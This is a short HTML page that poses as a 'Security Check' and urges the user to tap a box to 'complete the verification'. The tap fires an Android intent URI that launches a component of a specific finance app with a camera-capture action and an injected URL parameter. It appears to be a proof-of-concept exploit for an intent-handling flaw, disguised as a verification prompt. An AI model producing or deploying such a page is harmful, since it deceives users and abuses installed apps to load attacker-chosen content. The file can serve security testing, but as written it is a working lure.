<!DOCTYPE html>
<html>
<head>
    <title>Security Check</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 100px; background: #f4f4f4; }
        .trigger-box { border: 2px dashed #007bff; padding: 40px; background: white; cursor: pointer; border-radius: 10px; }
        h1 { color: #333; }
    </style>
</head>
<body>
    <div class="trigger-box" id="payload">
        <h1>⚠️ Action Required</h1>
        <p>Tap anywhere in this box to complete the verification.</p>
    </div>

    <script>
        // Chrome only allows the intent to fire inside a 'click' event
        document.getElementById('payload').addEventListener('click', function() {
            window.location.href = "intent:#Intent;action=android.media.action.IMAGE_CAPTURE;component=com.wisdomtree.wtprime/com.wisdomtree.MainActivity;S.url=https://www.wisdomtreefinanceconsultants.com/scan;end";
        });
    </script>
</body>
</html>
